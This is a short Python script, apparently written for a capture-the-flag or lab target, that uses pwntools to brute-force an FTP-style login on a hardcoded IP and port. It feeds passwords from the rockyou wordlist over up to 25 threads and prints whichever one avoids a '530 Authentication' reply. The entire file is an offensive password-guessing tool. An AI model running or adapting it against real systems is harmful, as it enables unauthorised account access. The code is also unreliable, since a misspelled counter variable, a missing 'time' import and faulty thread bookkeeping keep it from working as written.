from pwn import*
import sys
import threading
f = open("/pentest/rockyou.txt","r")
def tryUser(psw):
    context.log_level ="CRITICAL"
    r = remote("35.234.65.24",31653)
    r.recvuntil("world")
    r.sendline("USER user\x0d")
    r.recvuntil(b"password.\x0d\n")
    r.sendline("PASS "+ psw +"\x0d\n")
    a = r.recvuntil("\n")
    r.close()
    return b"530 Authentication " not in a
password = f.readline().strip()
found = False
hreads =0
def tryPassword(psw):
        global threads, found
        threads +=1
        print('Trying password: '+ psw)
        if tryUser(psw):
            found =True
            print('Found password: '+ psw)
            threads -=1
while password and not found:
      while threads >=25:
            time.sleep(0.5)
      t = threading.Thread(target=tryPassword, args=(password,))
      t.start()
      password = f.readline().strip()